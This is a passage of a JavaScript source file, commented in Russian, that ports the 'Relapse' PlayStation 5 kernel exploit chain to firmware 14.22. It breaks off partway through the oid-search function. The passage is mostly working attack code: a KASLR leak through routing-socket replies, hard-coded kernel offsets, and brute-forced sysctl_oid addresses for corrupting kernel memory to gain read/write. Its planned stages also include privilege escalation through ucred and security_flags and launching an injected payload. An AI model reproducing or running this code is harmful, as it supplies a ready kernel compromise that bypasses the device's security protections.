// relapse1422.js — kernel-стадия Relapse, портированная на PS5 firmware 14.22.
//
// ЭТАЛОН: recon/_src/relapse/m2k7m_Relapse-Exploit (Relapse, 7.00–13.60).
// Чейн оригинала (src/relapse_exploit.js, run()):
//   1. leakKernelBase()   — KASLR через routing-socket (RTM_GET) + ret-адрес
//   2. pinToSingleCore()  — прибить поток к одному ядру
//   3. armKernelReadWrite() — первое kernel R/W через AIO waiter + sysctl_oid
//   4. findCurrentProcess() — обход allproc, поиск curproc по pid
//   5. locatePipes()      — найти pipe-пары своего процесса
//   6. crossPipes()       — быстрый R/W через pipe buffer
//   7. defuseAioGroups()  — обезвредить вооружённые AIO-группы
//   8. escalate()         — ucred + security_flags
//   9. launchShellcode()  — отдать ядро payload-загрузчику
//
// ЧТО ИЗМЕНЕНО ПОД 14.22:
//   * константы Tier-1 (kernelData/allproc/security_flags/rootvnode/retStatic-окно);
//   * KASLR: вместо точного retStatic — проверка по ОКНУ и верификация kbase
//     чтением allproc (в 14.22 retStatic известен только как предсказание);
//   * oid/walkCounter/nodeMutex/rodataProbe в 14.22 НЕ подтверждены -> код их
//     ищет сам (discover*) и, если не находит, логирует блокер, не падая;
//   * блокер "aio_multi_delete закрыт в 14.20" НЕ влияет на цепочку: Relapse
//     использует AIO_MULTI_WAIT/POLL/CANCEL, а multi_delete в ней 0 раз
//     (проверено grep'ом по src/relapse_exploit.js). Вектор waiter count*0x38 —
//     основной и уже реализован. Отдельный вариант через MULTI_DELETE тоже
//     написан (armViaMultiDelete) на случай, если wait-вектор закроют.
//
// Интерфейс (как в оригинале):
//   export async function runKernelExploit(p, chain, log)
//   p      — userland-примитив: read1/read4/read8, write1/4/8, malloc, add32, read8->int64
//   chain  — объект syscall/ммap (utils/syscalls.js)
//   log    — функция вывода строки на экран консоли
//
// Дополнительно (для attack-скелета jb1422):
//   export async function runKernelExploitWith(prim, chain, log, options)
//   export { armViaWaiterVector, armViaMultiDelete }

const OFF = () => (typeof window !== "undefined" ? window.KRW : globalThis.KRW);

// Ошибка "примитив ещё не поднят" — не баг, а честный блокер стадии.
class BlockedError extends Error {
	constructor(msg) { super(msg); this.name = "BlockedError"; }
}

const SYS = {
	WRITE: 0x004,
	AIO_SUBMIT: 0x295,
	AIO_MULTI_DELETE: 0x296,
	AIO_MULTI_WAIT: 0x297,
	AIO_MULTI_POLL: 0x298,
	AIO_GET_DATA: 0x299,
	AIO_MULTI_CANCEL: 0x29A,
	AIO_SUBMIT_CMD: 0x29D,
	AIO_INIT: 0x29E,
	MMAP: 0x1DD,
	GETPID: 0x014,   // FreeBSD getpid = 20
	SOCKET: 0x061, CONNECT: 0x062, SENDTO: 0x085, CLOSE: 0x006, MPROTECT: 0x04A,
	CPUSET_GETAFFINITY: 0x1E7,
	CPUSET_SETAFFINITY: 0x1E8,
	PIPE2: 0x2AF,
	MPROTECT: 0x4A,
};
const AIO_CMD_READ = 1;
const RET_SLOT = 184;           // смещение ret в author-record ответа routing socket
const O_NONBLOCK = 0x4;
const PROT_RW = 0x3, PROT_RWX = 0x7;
const MAP_PRIVATE_ANON = 0x1002;

// ---------------------------------------------------------------- 64-битные адреса
class I64 {
	constructor(low, hi) { this.low = low >>> 0; this.hi = hi >>> 0; }
	static of(v) {
		if (v instanceof I64) return v;
		if (typeof v === "bigint") return new I64(Number(v & 0xffffffffn), Number((v >> 32n) & 0xffffffffn));
		if (typeof v === "object" && v && "low" in v) return new I64(v.low, v.hi || 0);
		return new I64(Number(v) >>> 0, Math.floor(Number(v) / 4294967296) >>> 0);
	}
	add32(n) {
		const low = (this.low + (n >>> 0)) >>> 0;
		const carry = low < this.low ? 1 : 0;
		return new I64(low, (this.hi + carry) >>> 0);
	}
	sub(o) {
		const oo = I64.of(o);
		const low = (this.low - oo.low) >>> 0;
		const borrow = this.low < oo.low ? 1 : 0;
		return new I64(low, (this.hi - oo.hi - borrow) >>> 0);
	}
	isZero() { return this.low === 0 && this.hi === 0; }
	eq(o) { const oo = I64.of(o); return this.low === oo.low && this.hi === oo.hi; }
	toString(radix = 16) {
		const hi = BigInt(this.hi), lo = BigInt(this.low);
		const v = (hi << 32n) | lo;
		return v.toString(radix);
	}
}

// В браузере offsets/1422.js может быть не подключён отдельным <script> — грузим лениво,
// иначе конструктор падает на «window.KRW не определён» (это ловил локальный прогон).
async function ensureOffsets() {
	if (OFF()) return OFF();
	try {
		await import(new URL("./offsets/1422.js", import.meta.url).href);
	} catch (e) {
		throw new Error("offsets/1422.js не загрузился: " + (e && e.message ? e.message : e));
	}
	if (!OFF()) throw new Error("offsets/1422.js не определил window.KRW");
	return OFF();
}

export async function runKernelExploit(p, chain, log) {
	await ensureOffsets();
	return new KernelExploit1422(p, chain, log, {}).run();
}
export async function runKernelExploitWith(p, chain, log, options) {
	await ensureOffsets();
	return new KernelExploit1422(p, chain, log, options || {}).run();
}

class KernelExploit1422 {
	constructor(p, chain, log, options) {
		this.p = p;
		this.chain = chain;
		this.options = options;
		this.logFn = typeof log === "function" ? log : () => {};
		this.off = OFF();
		if (!this.off) throw new Error("offsets/1422.js не определил window.KRW");
		this.tuning = Object.assign({}, this.off.tuning);
		this.kbase = null;
		this.krw = false;
		this.crossed = false;
		this.curproc = null;
		this.ucred = null;
		this.master = null;
		this.victim = null;
		this.armedGroups = [];
		this.discovered = {};
		this.stageResults = {};
		this.rw = null;              // armed kernel R/W: {read(addr,len), write(addr,bytes)}
		this.armedVia = null;
		this.kbaseCandidates = [];   // список кандидатов базы (STAGE 1)
		this.candIndex = 0;
	}

	// ------------------------------------------------------------- утилиты
	stage(n, name) { this.current = `STAGE ${n} [${name}]`; this.stageStatus = "OK"; this.log(this.current + ": start"); }
	ok(msg) { this.log(`${this.current}: OK — ${msg}`); }
	fail(msg) { this.stageStatus = "FAIL"; this.log(`${this.current}: FAIL — ${msg}`); this.stageResults[this.current] = "FAIL: " + msg; }
	degraded(msg) { if (this.stageStatus !== "FAIL") this.stageStatus = "DEGRADED"; this.log(`${this.current}: DEGRADED — ${msg}`); }
	log(t) { try { this.logFn(String(t)); } catch (_) {} }

	async sysInt(num, ...args) { return (await this.chain.syscall(num, ...args)).low | 0; }
	alloc(size) { const b = this.p.malloc(size, 1); for (let i = 0; i < size; i += 4) this.p.write4(b.add32(i), 0); return b; }
	async allocZeroed(size) {
		const b = this.p.malloc(size, 1);
		if (this.p && typeof this.p.writeBytes === "function") await this.p.writeBytes(b, new Uint8Array(size));
		else for (let i = 0; i < size; i += 4) this.writeU32(b.add32(i), 0);
		return b;
	}
	readU8(base, o) { return this.p.read1(base.add32(o)); }
	readU32(base, o) { return this.p.read4(base.add32(o)); }
	readU64(base, o) { return I64.of(this.p.read8(base.add32(o))); }
	writeU8(base, o, v) { this.p.write1(base.add32(o), v & 0xff); }
	writeU32(base, o, v) { this.p.write4(base.add32(o), v >>> 0); }
	writeU64(base, o, v) { this.p.write8(base.add32(o), I64.of(v)); }
	kaddr(rva) { return I64.of(this.kbase).add32(rva); }
	isKernelPointer(v) {
		const x = I64.of(v);
		return !x.isZero() && x.hi >>> 16 === 0xffff && (x.low & 7) === 0 && !(x.hi === 0xffffffff && x.low === 0xffffffff);
	}

	// ---------------------------------------------------- kernel R/W (armed)
	// ПРАВКА ПО ЗАМЕЧАНИЮ webkit-1422: адреса ЯДРА нельзя читать/писать через
	// userland-примитив p.read*/p.write* — он видит только адресное пространство
	// WebProcess, а не ядро. Пока kernel R/W не поднят (STAGE 3), любое обращение
	// к памяти ядра бросает BlockedError с точной причиной, а не тихо возвращает мусор.
	attachKernelRw(rw) {
		if (!rw || typeof rw.read !== "function" || typeof rw.write !== "function")
			throw new Error("attachKernelRw ожидает {read(addr,len)->Uint8Array|Array, write(addr,bytes)}");
		this.rw = rw;
		this.log("  [rw] kernel R/W примитив подключён извне (attachKernelRw)");
		return true;
	}
	requireRw(what) {
		if (!this.rw) throw new BlockedError(`kernel R/W не поднят — ${what} невозможен (нужен STAGE 3: oid-офсеты 14.22 или attachKernelRw/attachKernelPipe)`);
		return this.rw;
	}
	// ВАЖНО (оптимизация по замечанию recon-lua-vector): возвращаем БАЙТЫ, а не указатель
	// на процессный буфер. Раньше на каждый чанк сканера уходило 2*len обращений к
	// примитиву (writeU8 на запись в буфер + readU8 на чтение обратно): на 4 КиБ это 8192
	// round-trip'ов и 4.6 с по TCP — бюджет скана выгорал впустую. Теперь 1 round-trip на чанк.
	async kreadBytes(addr, len) {
		const rw = this.requireRw("чтение памяти ядра");
		const src = await rw.read(addr, len);
		const out = new Uint8Array(len);
		for (let i = 0; i < len; i++) out[i] = src[i] & 0xff;
		return out;
	}
	static u32(b, o = 0) { return (b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24)) >>> 0; }
	static u64From(b, o = 0) { return new I64(KernelExploit1422.u32(b, o), KernelExploit1422.u32(b, o + 4)); }
	// Чтение памяти ПРОЦЕССА (не ядра): если мост умеет readBytes — 1 round-trip,
	// иначе побайтовый фолбэк (на консоли p.* локальные, там это дёшево).
	async readProcessBytes(ptr, len) {
		if (this.p && typeof this.p.readBytes === "function") return await this.p.readBytes(ptr, len);
		const out = new Uint8Array(len);
		for (let i = 0; i < len; i++) out[i] = this.readU8(ptr, i);
		return out;
	}
	async kread8(addr) {
		const b = await this.kreadBytes(addr, 8);
		return { value: new I64(KernelExploit1422.u32(b, 0), KernelExploit1422.u32(b, 4)), rv: 0 };
	}
	async kread32(addr) {
		const b = await this.kreadBytes(addr, 4);
		return { value: KernelExploit1422.u32(b, 0) | 0, rv: 0 };
	}
	async kwrite32(addr, v) {
		const rw = this.requireRw("запись в память ядра");
		const b = new Uint8Array(4);
		for (let i = 0; i < 4; i++) b[i] = (v >>> (i * 8)) & 0xff;
		await rw.write(addr, b);
		return 0;
	}
	async kwrite64(addr, v) {
		const rw = this.requireRw("запись в память ядра");
		const x = I64.of(v), b = new Uint8Array(8);
		for (let i = 0; i < 4; i++) { b[i] = (x.low >>> (i * 8)) & 0xff; b[4 + i] = (x.hi >>> (i * 8)) & 0xff; }
		await rw.write(addr, b);
		return 0;
	}

	// =========================================================== ГЛАВНЫЙ ЦИКЛ
	async run() {
		this.log("Relapse1422: старт kernel-стадии (14.22)");
		// Userland-примитив обязан быть готов: без read64/write64 kernel-стадия физически
		// не может начаться (KASLR читается через примитив). На ПК (WebKitGTK post-fix)
		// p.ready()===false — это нормальный исход, и он должен быть BLOCKED с причиной,
		// а не FAIL без текста.
		if (this.p && typeof this.p.ready === "function" && !this.p.ready()) {
			const why = (this.p.reason && this.p.reason()) || "примитив не готов";
			this.log("  precondition: userland-примитив НЕ готов -> " + why);
			this.log("  на консоли 14.22 этот этап проходит (v900/p553), на ПК — ожидаемо нет");
			return {
				done: false, stage: 0, status: "BLOCKED",
				detail: "userland-примитив не готов: " + why,
				need: ["alias R/W self-test (STAGE 10)", "leaked address (STAGE 9)"],
				stages: [{ n: 0, name: "precondition: userland primitive", status: "BLOCKED", detail: why }],
			};
		}
		const stages = [
			[1, "KASLR candidates (RTM_GET, без чтения ядра)", () => this.leakKernelBase()],
			[2, "pin to single core", () => this.pinToSingleCore()],
			[3, "arm kernel R/W (waiter + oid/external)", () => this.armKernelReadWrite()],
			[4, "verify kbase (allproc через armed R/W)", () => this.verifyKbaseStage()],
			[5, "discover gadgets + syscall stubs", async () => {
				const g = await this.discoverGadgets();
				const st = await this.discoverSyscallStubs();
				return g + "; " + st;
			}],
			[6, "find current process (allproc)", () => this.findCurrentProcess()],
			[7, "locate pipes", () => this.locatePipes()],
			[8, "cross pipes (fast R/W)", () => this.crossPipes()],
			[9, "defuse aio groups", () => this.defuseAioGroups()],
			[10, "escalate (ucred + security_flags)", () => this.escalate()],
			[11, "launch payload (elfldr / mmap+launch)", () => this.launchPayload()],
			[12, "final report", () => this.reportFinal()],
			[13, "AIO sanity check (t1 trigger)", () => this.aioSanityCheck()],
		];
		let last = null;
		const table = [];
		for (const [n, name, fn] of stages) {
			this.stage(n, name);
			const t = Date.now();
			let detail = "";
			try {
				last = await fn();
				detail = typeof last === "object" && last ? JSON.stringify(last) : String(last);
			} catch (e) {
				this.fail(String((e && e.message) || e));
				table.push({ n, name, status: "FAIL", detail: String((e && e.message) || e), ms: Date.now() - t });
				return { kbase: this.kbase, done: false, stage: n, error: String((e && e.message) || e), stages: table };
			}
			const status = this.stageStatus || "OK";
			table.push({ n, name, status, detail: detail.slice(0, 120), ms: Date.now() - t });
			if (last === false) return { kbase: this.kbase, done: false, stage: n, stages: table };
			if (status === "OK") this.ok(detail.slice(0, 160));
			else this.log(`${this.current}: ${status} — идём дальше по fallback`);
		}
		this.log("Relapse1422: цепочка пройдена до конца");
		return { kbase: this.kbase, done: true, payloads: last, stages: table };
	}

	// ------------------------------------- STAGE 3: первое kernel R/W
	// ------------------------- генератор КАНДИДАТОВ oid.a/b/c для 14.22
	// ДОКАЗАНО ПО ИСХОДНИКАМ: координаты используются через this.kaddr(...), значит это
	// НЕ абсолютные адреса, а RVA от базы ядра (src/relapse_exploit.js:519 — kaddr(oid.b.arg1+4),
	// :1057 — writeKernel64(kaddr(oid.arg1), ...), :1059 — writeKernel32(kaddr(oid.kind), ...)).
	// Офлайн-дампа 14.22 нет, поэтому перебираем: координаты 13.60 + дельты, которые мы
	// наблюдали на других символах между 13.60 и 14.22. Вероятность убывает сверху вниз.
	oidLayout() { return { kind: 0x14, arg1: 0x18, arg1Byte1: 0x19, kindByte3: 0x17 }; }
	// Координаты 13.60. ДОКАЗАНО по исходникам: это RVA от базы ядра, не абсолют
	// (relapse_exploit.js:519/1057/1059 используют this.kaddr(oid.*)).
	oidBase1360() {
		const h = (this.off.oidHint && this.off.oidHint.v1360) || {};
		return {
			a: { name: "cpus", base: h.aBase || 0x028CEF68 },
			b: { name: "maxcpus", base: h.bBase || 0x028CEE40, kindValue: 0x7F048002 },
			c: { name: "priority_scheduling", base: h.cBase || 0x02BF1C38 },
		};
	}
	// Расстояния (oid - security_flags) ВНУТРИ 13.60, где security_flags = 0x01A5C064.
	oidDistances1360() {
		const sec1360 = 0x01A5C064;
		const b = this.oidBase1360();
		return { sec1360, a: (b.a.base - sec1360) >>> 0, b: (b.b.base - sec1360) >>> 0, c: (b.c.base - sec1360) >>> 0 };
	}
	// ДВЕ ВЕТКИ КАНДИДАТОВ:
	//   branchB "distance-from-security_flags" — приоритетная: расстояние внутри .data,
	//            приложенное к НАШЕМУ 14.22 security_flags (0x01A84064), + малые дрейфы;
	//   branchA "delta-from-13.60" — абсолютные дельты 13.60 -> 14.22.
	oidDeltas() {
		const b = this.oidBase1360();
		const dist = this.oidDistances1360();
		const sec1422 = Number(this.off.securityFlags) >>> 0;
		const branchB = [0, 0x1000, -0x1000, 0x2000, -0x2000].map((drift) => ({
			source: "distance-from-security_flags",
			detail: `0x${dist.a.toString(16)}${drift === 0 ? "" : (drift > 0 ? "+" : "-") + "0x" + Math.abs(drift).toString(16)}`,
			delta: drift, drift, fromSecurityFlags: true,
			why: `расстояние от security_flags 0x${sec1422.toString(16)} (внутри .data)`,
			dist,
			a: Object.assign({}, b.a, { base: (sec1422 + dist.a + drift) >>> 0 }),
			b: Object.assign({}, b.b, { base: (sec1422 + dist.b + drift) >>> 0 }),
			c: Object.assign({}, b.c, { base: (sec1422 + dist.c + drift) >>> 0 }),
		}));
		const branchA = [
			[0x28000, "как security_flags (.data) — самый вероятный"],
			[0x30000, "как rootvnode"], [0x30020, "как allproc"], [0x20000, "как kernelData"],
			[0x48000, "security_flags+kernelData"], [0x50000, "rootvnode+kernelData"], [0x0, "контроль"],
		].map(([delta, why]) => ({
			source: "delta-from-13.60", detail: `+0x${delta.toString(16)}`, delta, why, fromSecurityFlags: false,
			a: Object.assign({}, b.a, { base: (b.a.base + delta) >>> 0 }),
			b: Object.assign({}, b.b, { base: (b.b.base + delta) >>> 0 }),
			c: Object.assign({}, b.c, { base: (b.c.base + delta) >>> 0 }),
		}));
		return [...branchB, ...branchA];
	}
	oidCandidates() {
		const L = this.oidLayout();
		const out = [], seen = new Set();
		for (const raw of this.oidDeltas()) {
			const c = Object.assign({}, raw, {
				originalKind: 0x80048002, writableKind: 0x70048002,
				a: Object.assign({}, raw.a, { kind: (raw.a.base + L.kind) >>> 0, arg1: (raw.a.base + L.arg1) >>> 0 }),
				b: Object.assign({}, raw.b, { kind: (raw.b.base + L.kind) >>> 0, arg1: (raw.b.base + L.arg1) >>> 0 }),
				c: Object.assign({}, raw.c, { kind: (raw.c.base + L.kind) >>> 0, arg1: (raw.c.base + L.arg1) >>> 0 }),
			});
			const key = c.a.base >>> 0;
			if (seen.has(key)) continue;
			seen.add(key);
			out.push(c);
		}
		return out;
	}
	// Расстояния (oid - security_flags) ВНУТРИ 13.60. Считаются по 13.60,
	// где security_flags = 0x01A5C064 (для 14.22 он 0x01A84064 — к нему прибавляем эти же расстояния).
	// ВЕТКА 1 — абсолютные дельты 13.60 -> 14.22 (по наблюдаемым символам).
	// ВЕТКА 2 — расстояния ВНУТРИ .data: (oid - security_flags) в 13.60, приложенные
	//           к НАШЕМУ 14.22 security_flags. Дрейф расстояния меньше дрейфа секции.
	// ВАЖНО про арифметику: расстояние считается по 13.60, где security_flags = 0x01A5C064
	// (а НЕ 0x01A84064 — это уже 14.22). Затем расстояние прибавляется к 0x01A84064.

	// ------------------------------------------------- STAGE 1: KASLR (кандидаты)
	// КАК В ОРИГИНАЛЕ и с учётом замечания webkit-1422: на этом шаге мы НЕ читаем
	// память ядра (её ещё нельзя читать). Только: ответ routing-socket (память
	// процесса через p.read*/leakval) + арифметика ret - retStatic.
	// Вместо одной базы строим СПИСОК кандидатов по сетке KASLR PS5 (0x200000):
	// база-предсказание и ±N страниц. Подтверждение allproc вынесено в STAGE 4,
	// где R/W уже поднят.
	async leakKernelBase() {
		const kaslr = this.off.kaslr;
		if (!kaslr) throw new Error("offsets.kaslr отсутствует");
		if (kaslr.mode !== "rtmsg2") throw new Error("неизвестный режим KASLR: " + kaslr.mode);
		if (!this.p || typeof this.p.read8 !== "function")
			throw new BlockedError("userland-доступ к памяти процесса не подключён (p.read8) — нужен userland-примитив/leakval от моста");

		let reply;
		try {
			reply = await this.routingSocketReply();
		} catch (e) {
			if (e instanceof BlockedError) throw e;
			throw new BlockedError("routing socket недоступен: " + ((e && e.message) || e));
		}
		if (!reply) throw new BlockedError("routing socket не дал ответа (gated/закрыт) — KASLR не утёк; нужен syscall-backend (chain.rtmsg2)");
		// ВНИМАНИЕ: в классе ДВЕ реализации leakKernelBase (вторая перекрывает первую).
		// Обе должны понимать три вида ответа: {ptr,bytes} от моста, готовый буфер и указатель.
		const replyBytes = await this.replyToBytes(reply);
		const authorCands = this.findAuthorRecordCandidates(replyBytes);
		const wantLow16 = kaslr.retLow16;
		let author = null, ret = null;
		for (const a of authorCands) {
			const r = KernelExploit1422.u64From(replyBytes, a + RET_SLOT);
			if (wantLow16 === undefined || (r.low & 0xffff) === wantLow16) { author = a; ret = r; break; }
		}
		if (author === null) {
			const head = Array.from(replyBytes.slice(0, 48)).map((x) => x.toString(16).padStart(2, "0")).join(" ");
			this.log(`  [kaslr] ДИАГНОСТИКА: len=${replyBytes.length}, первые 48 байт = ${head}`);
			this.log(`  [kaslr] кандидаты author = [${authorCands.join(", ")}], искали retLow16=0x${(wantLow16 || 0).toString(16)}`);
			throw new Error("в ответе нет author-record");
		}
		this.log(`  [kaslr] ответ ${replyBytes.length} байт, author-record @+${author}`);
		this.log(`  [kaslr] ответ сокета прочитан бульком: ${replyBytes.length} байт (readBytes=${typeof this.p.readBytes === "function"})`);
		this.log(`  author+${RET_SLOT} ret = 0x${ret.toString(16)}`);

		const predict = I64.of(kaslr.retStatic);
		const page = 0x200000;                                  // шаг KASLR на PS5
		const pages = this.options.kaslrPages || 8;
		const base0 = new I64((ret.low - predict.low) >>> 0, ret.hi);
		const window = kaslr.window;
		const cands = [base0];
		// push(delta) сдвигает КАНДИДАТА базы; retStatic = predict - delta
		const push = (delta) => {
			const low = (base0.low + delta) >>> 0;
			if (!cands.some((c) => c.low === low && c.hi === base0.hi)) cands.push(new I64(low, base0.hi));
		};
		// гипотеза 1: ошибка retStatic кратна странице KASLR (0x200000)
		for (let k = 1; k <= pages; k++) { push(-k * page); push(k * page); }
		// гипотеза 2: retStatic смещён внутри известного окна (шаг 0x1000) —
		// именно этот перебор может набрать >=3 кандидатов и включить self-DoS guard
		if (window) {
			const half = Math.floor((window.hi - window.lo) / 2);
			for (let d = 0x1000; d <= half; d += 0x1000) { push(-d); push(d); }
		}
		this.kbaseCandidates = cands;
		this.candIndex = 0;
		this.kbase = this.kbaseCandidates[0];
		this.log(`  [KASLR] сетка 0x${page.toString(16)}: кандидатов ${this.kbaseCandidates.length}` +
			` (первый 0x${this.kbase.toString(16)}, последний 0x${this.kbaseCandidates[this.kbaseCandidates.length - 1].toString(16)})`);
		this.log(`  [KASLR] проверка allproc отложена до STAGE 4 (до поднятия R/W читать ядро нельзя)`);
		return `кандидатов ${this.kbaseCandidates.length}, выбран 0x${this.kbase.toString(16)}`;
	}

	// ------------------------------------------------- STAGE 4: проверка базы
	// Подтверждаем kbase чтением allproc через УЖЕ поднятый R/W. Перебираем
	// кандидатов по одному; серия из 3 «мусорных» чтений останавливает перебор
	// (self-DoS guard), чтобы не зависнуть на консоли.
	async verifyKbaseStage() {
		if (!this.rw) throw new BlockedError("kernel R/W не поднят — проверить базу нечем (STAGE 4 без R/W невозможен)");
		const total = this.kbaseCandidates.length;
		const maxGarbage = this.options.kaslrMaxMisses || 3;
		const budgetMs = this.options.kaslrBudgetMs || 2000;
		const t0 = Date.now();
		let garbage = 0, checked = 0;
		for (let i = this.candIndex; i < total; i++) {
			if (Date.now() - t0 > budgetMs) { this.log(`  [verify] бюджет ${budgetMs} мс исчерпан после ${checked} кандидатов`); break; }
			this.kbase = this.kbaseCandidates[i];
			this.candIndex = i;
			checked++;
			this.log(`  [verify] кандидат ${i + 1}/${total}: база 0x${this.kbase.toString(16)}`);
			const v = await this.probeKbaseArmed();
			if (v === "ok") {
				this.discovered.kbase = this.kbase.toString(16);
				this.log(`  [verify] allproc подтвердила базу 0x${this.kbase.toString(16)} (кандидат ${i + 1}/${total})`);
				return `kbase подтверждена (кандидат ${i + 1}/${total})`;
			}
			if (v === "garbage") garbage++;
			if (garbage >= maxGarbage) {
				this.log(`  [verify] STOP: ${garbage} мусорных чтений allproc подряд — self-DoS guard`);
				break;
			}
		}
		this.kbase = null;
		this.log(`  KASLR not found in window (проверено ${checked} из ${total}, мусорных ${garbage}, ${Date.now() - t0} мс)`);
		throw new Error(`KASLR not found in window — база не подтверждена после ${checked} кандидатов`);
	}

	// ok / garbage (прочитали, но не похоже на ядро) / unreadable (исключение)
	async probeKbaseArmed() {
		try {
			const allproc = this.kaddr(this.off.allproc);
			for (const o of [0x0, 0x8, 0x10]) {
				const head = (await this.kread8(allproc.add32(o))).value;
				if (this.isKernelPointer(head)) return "ok";
			}
			const kd = (await this.kread32(this.kaddr(this.off.kernelData))).value | 0;
			if (kd !== 0 && kd !== -1) return "ok";
			return "garbage";
		} catch (e) {
			if (e instanceof BlockedError) throw e;
			return "unreadable";
		}
	}

	async routingSocketReply() {
		// В браузере PS5 routing socket доступен через syscall-обёртку пользователя
		// (в оригинале — тот же путь). Если примитива нет — честно сообщаем.
		if (this.chain && typeof this.chain.rtmsg2 === "function") {
			const reply = await this.chain.rtmsg2();
			if (!reply) return null;
			return this.copyIntoProcess(reply);
		}
		if (this.options.rtmsgReply) return this.copyIntoProcess(this.options.rtmsgReply);
		this.degraded("chain.rtmsg2 отсутствует; KASLR-ответ можно передать через options.rtmsgReply");
		return null;
	}
	copyIntoProcess(bytes) {
		const src = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
		const buf = this.alloc(src.length + 16);
		for (let i = 0; i < src.length; i++) this.writeU8(buf, i, src[i]);
		this.replyLen = src.length;
		return buf;
	}
	// Любой вид ответа -> байты. Виды: {ptr,bytes} (мост), готовый буфер/массив, указатель.
	// Ловушка, на которой падала стадия 1 через TCP: {ptr,bytes} принимали за указатель.
	static toBytes(v) {
		if (!v) return null;
		if (v instanceof Uint8Array) return v;
		if (ArrayBuffer.isView(v)) return new Uint8Array(v.buffer, v.byteOffset, v.byteLength);
		if (Array.isArray(v)) return Uint8Array.from(v);
		if (typeof v === "object" && typeof v.length === "number") {
			try { return Uint8Array.from(v); } catch (e) { return null; }
		}
		return null;
	}
	async replyToBytes(reply) {
		const direct = KernelExploit1422.toBytes(reply);
		if (direct) return direct;
		const inner = KernelExploit1422.toBytes(reply && reply.bytes);
		if (inner) return inner;
		const ptr = (reply && reply.ptr) || reply;
		const len = (reply && reply.bytes && reply.bytes.length) || this.replyLen || 512;
		if (this.p && typeof this.p.readBytes === "function") {
			const b = KernelExploit1422.toBytes(await this.p.readBytes(ptr, len));
			if (b) return b;
		}
		return await this.readProcessBytes(ptr, len + 16);
	}
	findAuthorRecordCandidates(bytes) {
		const out = [];
		for (let i = 0; i + 8 < bytes.length; i += 4) {
			if (bytes[i] === 0x04 && bytes[i + 1] === 0x00) out.push(i);
		}
		if (bytes.length > RET_SLOT + 8) out.push(bytes.length - RET_SLOT - 16);
		out.push(0);
		return [...new Set(out)].filter((o) => o >= 0 && o + RET_SLOT + 8 <= bytes.length);
	}
	findAuthorRecordIn(bytes) { return this.findAuthorRecordCandidates(bytes)[0] ?? null; }
	findAuthorRecord(replyPtr) {
		// sockaddr_rtmsg2author лежит в конце сообщения; ищем маркер rtm_type==RTM_GET(4)
		// и отдаём начало записи. Дополнительно допускаем позицию len-RET_SLOT-16.
		for (let i = 0; i + 8 < this.replyLen; i += 4) {
			if (this.readU8(replyPtr, i) === 0x04 && this.readU8(replyPtr, i + 1) === 0x00) return i;
		}
		return this.replyLen > RET_SLOT + 8 ? this.replyLen - RET_SLOT - 16 : null;
	}

	// --------------------------------------------- STAGE 2: affinity
	async pinToSingleCore() {
		const cur = this.alloc(0x10);
		const id = new I64(0xffffffff, 0xffffffff);
		await this.sysInt(SYS.CPUSET_GETAFFINITY, 3, 1, id, 0x10, cur);
		const allowed = this.readU32(cur, 0) >>> 0;
		let core = -1;
		for (let c = 0; c < 16 && core < 0; c++) if (allowed & (1 << c)) core = c;
		if (core < 0) throw new Error("нет разрешённых ядер в маске 0x" + allowed.toString(16));
		const mask = this.alloc(0x10);
		this.writeU8(mask, (core >> 3) & 0xf, 1 << (core & 7));
		await this.sysInt(SYS.CPUSET_SETAFFINITY, 3, 1, id, 0x10, mask);
		this.allowedMask = allowed;
		return `core ${core} (маска 0x${allowed.toString(16)})`;
	}

	// ------------------------------------- STAGE 3: первое kernel R/W
	// ------------------------- генератор КАНДИДАТОВ oid.a/b/c для 14.22
	// ДОКАЗАНО ПО ИСХОДНИКАМ: координаты используются через this.kaddr(...), значит это
	// НЕ абсолютные адреса, а RVA от базы ядра (src/relapse_exploit.js:519 — kaddr(oid.b.arg1+4),
	// :1057 — writeKernel64(kaddr(oid.arg1), ...), :1059 — writeKernel32(kaddr(oid.kind), ...)).
	// Офлайн-дампа 14.22 нет, поэтому перебираем: координаты 13.60 + дельты, которые мы
	// наблюдали на других символах между 13.60 и 14.22. Вероятность убывает сверху вниз.
	// Расстояния (oid - security_flags) ВНУТРИ 13.60. Считаются по 13.60,
	// где security_flags = 0x01A5C064 (для 14.22 он 0x01A84064 — к нему прибавляем эти же расстояния).
	// ВЕТКА 1 — абсолютные дельты 13.60 -> 14.22 (по наблюдаемым символам).
	// ВЕТКА 2 — расстояния ВНУТРИ .data: (oid - security_flags) в 13.60, приложенные
	//           к НАШЕМУ 14.22 security_flags. Дрейф расстояния меньше дрейфа секции.
	// ВАЖНО про арифметику: расстояние считается по 13.60, где security_flags = 0x01A5C064
	// (а НЕ 0x01A84064 — это уже 14.22). Затем расстояние прибавляется к 0x01A84064.
	async findOid() {
		const cands = this.oidCandidates();
		const L = this.oidLayout();
		const canRead = !!this.rw;
		const maxFlips = this.options.oidMaxFlips ?? (canRead ? cands.length : 2);
		const d = this.oidDistances1360();
		this.log(`  [oid] кандидатов ${cands.length}: ветка B (security_flags 0x${Number(this.off.securityFlags).toString(16)} + расстояния ` +
			`0x${d.a.toString(16)}/0x${d.b.toString(16)}/0x${d.c.toString(16)}) + ветка A (13.60 + дельты), дедуп по oid.a`);
		// сходимость двух независимых генераторов — сильный признак верного адреса
		const convA = (this.oidBase1360().a.base + 0x28000) >>> 0;
		const convB = (Number(this.off.securityFlags) + this.oidDistances1360().a) >>> 0;
		this.log(`  [oid] сходимость веток: A (13.60+0x28000) = 0x${convA.toString(16)}, B (security_flags+dist) = 0x${convB.toString(16)} -> ${convA === convB ? "СОВПАЛИ (высокая уверенность)" : "различаются, перебор по обеим"}`);
		const bySrc = cands.reduce((m, c) => (m[c.source] = (m[c.source] || 0) + 1, m), {});
		this.log(`  [oid] источники: ${Object.entries(bySrc).map(([k, v]) => `${k} ×${v}`).join(", ")}; всего ${cands.length}`);
		this.log(`  [oid] проверка структуры: ${canRead ? "доступна" : `НЕТ — флип только для первых ${maxFlips} (защита от паники)`}`);
		const rows = [];
		let flips = 0;
		for (const cand of cands) {
			const kindAddr = this.kaddr(cand.a.base + L.kind);
			let struct = "нет чтения", original = null;
			if (canRead) {
				try {
					original = (await this.kread32(kindAddr)).value >>> 0;
					const okKind = original === cand.originalKind || original === cand.b.kindValue;
					struct = okKind ? `да (0x${original.toString(16)})` : `нет (0x${original.toString(16)})`;
					if (!okKind) { rows.push({ addr: kindAddr.toString(16), source: cand.source, delta: cand.delta, struct, flip: "пропуск" }); continue; }
				} catch (e) { struct = "чтение не удалось"; }
			}
